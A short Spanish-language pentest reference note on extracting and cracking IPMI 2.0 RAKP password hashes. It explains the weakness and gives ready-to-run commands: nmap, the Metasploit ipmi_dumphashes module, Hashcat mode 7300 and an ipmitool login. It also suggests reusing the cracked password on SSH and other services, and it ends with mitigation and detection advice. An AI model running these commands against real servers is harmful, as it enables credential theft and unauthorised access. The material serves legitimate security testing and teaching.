---
topic: Hash RAKP de IPMI 2.0
tags: [linux, ipmi, rakp, hashcat, credentials]
---

# Hash RAKP de IPMI 2.0

[🌐 English](ipmi-rakp-hash.en.md) | **Español**

## Concepto

IPMI 2.0 con autenticación RAKP envía un hash HMAC-SHA1 derivado de la contraseña del usuario. Un atacante puede solicitar el hash sin autenticarse y crackearlo offline para obtener la contraseña.

## Cuándo aplica

- Puerto UDP/623 accesible.
- IPMI 2.0 con usuarios válidos.
- Contraseñas débiles o reutilizadas en el sistema.

## Procedimiento

1. Confirmar IPMI con `nmap -sU -p623`.
2. Lanzar el escáner de hashes RAKP.
3. Crackear el hash con Hashcat modo 7300.
4. Probar la contraseña contra SSH, web o el propio IPMI.

```bash
nmap -sU -p623 <IP>
msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <IP>; run'
hashcat -m 7300 ipmi.hash /usr/share/wordlists/rockyou.txt
ipmitool -I lanplus -H <IP> -U <USER> -P '<PASS>' chassis status
```

## Variantes

- IPMI 1.5 sin RAKP.
- Usuarios por defecto o comunidad SNMP.
- Hash capturado con `ipmi_dumphashes` y crackeado con John.
- Reutilización de la contraseña en Zabbix o SSH.

## Limitaciones

- IPMI debe estar expuesto y permitir RAKP.
- Contraseñas robustas resisten el cracking.
- Algunos BMC bloquean múltiples intentos.

## Mitigación y detección

- Aislar IPMI en una red de gestión y deshabilitar RAKP si es posible.
- Usar contraseñas largas y únicas; rotarlas.
- Monitorizar consultas RAKP y accesos anómalos a UDP/623.

## Referencias

- <https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/ipmi/ipmi_dumphashes.rb>
- <https://hashcat.net/wiki/doku.php?id=example_hashes>
- <https://www.dmtf.org/standards/ipmi>
